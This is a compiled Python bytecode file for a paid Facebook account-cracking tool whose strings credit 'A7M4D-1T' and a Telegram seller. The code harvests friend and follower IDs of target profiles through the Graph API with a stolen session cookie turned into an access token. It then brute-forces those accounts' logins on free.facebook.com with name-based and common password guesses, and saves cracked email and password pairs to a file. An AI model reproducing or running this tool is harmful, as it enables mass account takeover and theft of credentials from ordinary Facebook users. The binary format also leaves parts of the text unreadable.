a
    5�b�*  �                   @   s  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlm	Z	 d dl
mZ d dlmZ dZdZdZd	Zd
ZdZg g g   ZZZg Zdadd� Ze�  dd� Zdd� Zdd� ZG dd� d�ZG dd� d�ZG dd� de�Zdd� Z e!dk�re�"d� e �  e�  dS )�    N)�BeautifulSoup)�choice)�ThreadPoolExecutor)�timez[0;97mz[0;91mz[0;92mz[0;93mz[0;94mz[0;96mc                  C   s�   t t�� �t t�� � } d�| �}td| � t�d�j}||v rXtd� t t�� �}n&td� td� t�	d� t
�  t�  d S )N�-z[37;1mYour ID : zAhttps://raw.githubusercontent.com/A7M4D-1T/NEW-TOOLS/main/.Serverz[92mYOUR ID IS ACTIVE.........z[91mYOUR ID IS NOT ACTIVE  zH[90mBUY ( 1 MOON 15$ ) ( 1 Weekly 10$ ) MY TELEGRAM == >> @KALILINUX404z#xdg-open  https://t.me/KALILINUX404)�str�os�geteuid�getlogin�join�print�requests�get�text�system�exit�buy)�uuid�idZLINUX�msg� r   �b.pyr      s    

r   c                 C   s|   d| i}t �� jdddddddd	d
dd�	|d�}z4zt�dt|j���d�}W n   d}Y n0 W |S |     Y S 0 d S )N�cookiez0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.com�1z#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	z
user-agentZreferer�host�originzupgrade-insecure-requests�accept-languagezcache-control�acceptzcontent-type��headers�cookiesz	(EAAG\w+)�   �Cookies Invalid)r   �Sessionr   �re�searchr   r   �group)r   r!   �res�tokenr   r   r   �convert!   s&    
�
�r*   c                   C   s   t t� ��d�d S )N�.r   )r   �mek�splitr   r   r   r   �	real_time5   s    r.   c                 C   sx   t |d�}|�dddi�}dd� |�ddd	d
gi�D �}t | jd|�d� |d�jd�}|�d�D ]}t�|j� qbtS )N�html.parser�form�method�postc                 S   s   i | ]}|� d �|� d��qS ��name�value�r   )�.0�xr   r   r   �
<dictcomp>;   �    zsesi.<locals>.<dictcomp>�input�type�hidden�submit�https://free.facebook.com�action)�data�option)r   �find�find_allr2   r   r   �opsi�append)�sessionr(   �responser0   rA   �r�ir   r   r   �sesi8   s    
 rK   c                   @   s,   e Zd Zdd� Zedd� �Zedd� �ZdS )�Mainc                 K   s*   d|d i|d  | _ | _g | _d| _d S )Nr   �cokir)   r?   )rM   r)   �data_id�free)�self�kwargsr   r   r   �__init__B   s    zMain.__init__c                 C   s@   t jd| j� �| jd��� }|d |d  | _| _| j| jd�S )Nz:https://graph.facebook.com/me?fields=name,id&access_token=�r!   r4   r   )r4   r   )r   r   r)   rM   �jsonr4   r   )rP   rI   r   r   r   �ARCHF   s    z	Main.ARCHc                 C   s�  z
| j }W n. ty8   t�d� t�d� td� Y n0 td|d � d|d � �� td� td	�}g d
�}||vr�td� td�}qn|dk�rP|dkr�td� td�}z<tjd|� d| j	� �| j
d��� }|d }td|� �� W n t�y   td� Y n0 |dk�r,| jd|� d| j	� �dd� n| jd|� d| j	� �dd� | j nz|dk�r�t�d� t�d� td| j� �� nJtd� z,td� tdd��� D ]}t|� � �q�W n   td � Y n0 d S )!N�
data/token�	data/cokiz EXPIRED COOKIES AND TOKEN z YOUR ACCOUNT ==>> r4   z, r   zg
	[1] NEW DUMP FROM ID PUBLIC (FACEBOOK)
	[2] CHECK RESULTS OK/CP
	[0] LOGOUT ACCOUNT (FACEBOOK)
	 				z ==>> CHOSEE: )�0r   �2z CHOSEE NOT FOUNDz ==>> CHOESS: r   z8
REDME ==>> COPYE LINK FACEBOOK CONVERT IN ID PASTE HEREzTARGET ID FACEBOOK ==>>  zhttps://graph.facebook.com/z?fields=name,id&access_token=rS   zNAME FACEBOOK ==>> zTARGET ID FACEBOOK NOT FOUND z-?fields=friends.fields(name,id)&access_token=�friends)�url�chosez-?fields=subscribers.limit(5000)&access_token=Z	followersrX   z
LOGOUT SUCCESSFULLY, GOOD BYE z
CHECK RESULTS OKzOK RESULTS :�data/okrI   z
RESULTS 0 )rU   �KeyErrorr   �remover   r   r;   r   r   r)   rM   rT   �dumpAccount�validater4   �open�	readlines)rP   �infor\   Znumber_listZaccount_targetrI   Ztarget_namer8   r   r   r   �MenuK   sF    
�

"(
z	Main.MenuN)�__name__�
__module__�__qualname__rR   �propertyrU   re   r   r   r   r   rL   A   s
   
rL   c                   @   s   e Zd Zdd� ZdS )�Crackc           	      C   s�  t �� }|D �]�}t|j|� d|� d�ddddddd	d
ddddddddd�d�jd�}dd� |�dddi��ddddgi�D �}|�|ddd �t	� |�d!�� |j
|� d"�|ddd#ddddd	d$d%d&dddddd'|� d�d(dd)�d*� d+|j�� v �rrt�|d, | � td-d.��|d, | d/ � d0�d1d2� |j�� �� D ��}| �|� tj�d3t||tf � tj��   �q�tj�d4tt�tt�tt�tt�f � tj��  qt�d5� d S )6Nz"/login/device-based/password/?uid=z)&flow=login_no_pin&refsrc=deprecated&_rdr�free.facebook.comz
keep-aliver   z)" Not A;Brand";v="99", "Chromium";v="101"z?1z	"Android"r   zGMozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zsame-originZnavigate�documentz-https://free.facebook.com/login/device-based/zgzip, deflate�id-ID,id;q=0.9)�Host�
Connection�Cache-Control�	sec-ch-ua�sec-ch-ua-mobile�sec-ch-ua-platform�Upgrade-Insecure-Requests�
User-Agent�Accept�Sec-Fetch-Site�Sec-Fetch-Mode�Sec-Fetch-User�Sec-Fetch-Dest�Referer�Accept-Encoding�Accept-Language)r    r/   c                 S   s   i | ]}|� d �|� d��qS r3   r6   )r7   �_r   r   r   r9   �   r:   zCrack.crack.<locals>.<dictcomp>r0   r1   r2   r;   r4   ZlsdZjazoestz,https://free.facebook.com/login/save-device/Zlogin_no_pinz#PWD_BROWSER:0:{}:{})�uid�next�flowZencpassz&/login/device-based/validate-password/Z142r?   z!application/x-www-form-urlencodedz{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z;https://free.facebook.com/login/device-based/password/?uid=zgzip, deflate, br)rn   ro   zContent-Lengthrp   rq   rr   rs   rt   ZOriginzContent-Typeru   rv   rw   rx   ry   rz   r{   r|   r}   )rA   r    Zc_user�|r]   �a�
�;c                 S   s   g | ]\}}d ||f �qS )z%s=%sr   )r7   �k�vr   r   r   �
<listcomp>�   r:   zCrack.crack.<locals>.<listcomp>z@
%s ACCOUNT SUCCESSFULLY
 > EMAIL: %s
 > PASS: %s
 A7M4D-1T 
%sz"         CEHCK %s/%s OK/CP:-%s/%sza7m4d-1t)r   r$   r   r   r   rC   ZfindAll�update�formatr.   r2   r!   Zget_dict�okrF   rb   �writer   �items�ahmad�sys�stdout�H�P�flush�len�looprN   �cp)	rP   �userZpassword_listr[   rG   �pwrI   rA   rM   r   r   r   �crackv   s|    
�
�*��
�


(zCrack.crackN)rf   rg   rh   r�   r   r   r   r   rj   u   s   rj   c                   @   s4   e Zd Zedd� �Zedd� �Zdd� Zdd� Zd	S )
�A7Ac                 C   s"   t d� td�}t d� |�d�S )Nz2
ADD PASSWORD MAKE (,) 
 ==>> HOW : 123,1234,12345zADD PASSWORD ==>> : � �,)r   r;   r-   )rP   Z	_passwordr   r   r   �_password_split�   s    zA7A._password_splitc           	      C   s  t d�}|dkr| j}td� td� tdd����}| jD �]�}|�� }|�d�\}}|�d�}t|d �d	k�r�||d d
 |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d  |d d! |d d" |d d# |d d$ g}�n>t|d �d%k�r�||d d
 |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d  |d d! |d d" |d d# |d d$ g}�n||d d
 |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d |d d  |d d! |d d" |d d# |d d$ g}|dk�r�|| }|�t	� j
||| j� q:W d   � n1 �s0    Y  td&� d S )'Nz[Y/N] ADD PASSWORD ==>> �y� z0   CRACK STARTING WAITING STOP TOOLS CTRL -Z   
�#   )�max_workers�><r   �   Z123Z1234Z12345Z123456�	123456789r   Z12Z1212Z1122Z321Z123321Z123123Z112233Z1995Z1999�2000Z2001Z2002Z2003Z2004Z2005Z2006Z2020Z2021Z2022Z11223344Z44332211�   z+ PROGRAMING BY A7M4D-1T python3 A7M4D-1T.py)r;   r�   r   r   rN   �lowerr-   r�   r>   rj   r�   rO   r   )	rP   �add�pasZkalir8   Znameer   r4   Z_A7A__password_listr   r   r   ra   �   s4    �
� � � 
8�zA7A.validatec              	   K   s�   |d dkr,t j|d � | jd��� d }nt j|d � | jd��� d }|d D ]8}z | j�|d d |d	  � W qR ty�   Y qR0 qR| jatd
t| j�� �� | j	 d S )Nr\   rZ   r[   rS   ZsubscribersrA   r4   r�   r   zTOTAL ID ==>> )
r   r   rM   rT   rN   rF   r^   r   r�   ra   )rP   Zlive_gantengrI   r8   r   r   r   r`   �   s      �zA7A.dumpAccountc                 C   s�   t �� �v}t|j| j� d�ddd�d|id�jd�jdd	d
�}|rp|j| j� |�d� d|id�W  d   � S W d   � n1 s�0    Y  d S )Nz/kali.linux.404rk   rm   )r   r   r   r   r/   r�   ZIkuti)�stringZhrefrS   )r   r$   r   r   rO   r   rC   )rP   rM   rG   Z_linkr   r   r   r�   �   s    
4z	A7A.ahmadN)rf   rg   rh   ri   r�   ra   r`   r�   r   r   r   r   r�   �   s   

r�   c               	   C   s�   z.t dd��� } t dd��� }t| |d�j W n� ty�   zt�d� W n   Y n0 td�}t|�} t�	d� | dkr�t
d	� t dd
��| � t dd
��|� t| |d�}|j |�|� |j |j t�	d� Y n0 d S )NrV   rI   rW   )r)   rM   rA   z LOGIN ==>>> COOKIES : �clearr#   z cookies Invalid r�   )rb   �readr�   re   �FileNotFoundErrorr   �mkdirr;   r*   r   r   r�   rU   r�   r   )r)   rM   ZSuccessr   r   r   �_login�   s     
(r�   �__main__r�   )#r   r%   r   �randomr�   �base64�platformZbs4r   r   �concurrent.futuresr   r   r,   r�   �Mr�   �K�BZBMr�   r�   r�   rE   rN   r   r*   r.   rK   rL   rj   r�   r�   rf   r   r   r   r   r   �<module>   s4   8	4?7

